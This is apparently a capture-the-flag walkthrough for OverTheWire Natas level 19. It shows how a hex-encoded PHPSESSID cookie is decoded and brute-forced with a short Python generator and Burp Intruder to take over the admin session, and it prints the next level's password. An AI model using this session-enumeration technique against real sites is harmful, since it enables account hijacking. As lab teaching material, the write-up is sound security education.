`Link` : `https://overthewire.org/wargames/natas/natas19.html`

## [𝐖𝐚𝐥𝐤𝐭𝐡𝐫𝐨𝐮𝐠𝐡] ~ 𝐍𝐚𝐭𝐚𝐬 𝐋𝐞𝐯𝐞𝐥 𝟏𝟖 - 𝐋𝐞𝐯𝐞𝐥 𝟏𝟗
## 𝐆𝐢𝐯𝐞𝐧
- Username: natas19
- URL: `http://natas19.natas.labs.overthewire.org`

## 𝐒𝐨𝐥𝐮𝐭𝐢𝐨𝐧

- Visit: `http://natas19.natas.labs.overthewire.org`
- Notice the phpsessionid : `Cookie: PHPSESSID=3431322d61646d696e`
- At first glance, it looks like `ascii hex` encode
- Let's check in burp decoder:
- ![image](https://user-images.githubusercontent.com/68887544/149760602-35fcf84b-b945-4c21-aa74-612ec9fdc6cb.png)
- we were right!
- Let's generate payload! It's tedious to write each number one by one, let's use python for that.

```
#!/bin/env python3


for i in range(1000):
    print(f"{i}-admin")

```
- Intruder attack, payload processing to hex & Boom we hit the admin account!
- ![image](https://user-images.githubusercontent.com/68887544/149760958-cecf0276-0a0f-4b9f-9d2e-7a6ffc9124db.png)

```
You are an admin. The credentials for the next level are:<br><pre>Username: natas20
Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</pre>
```
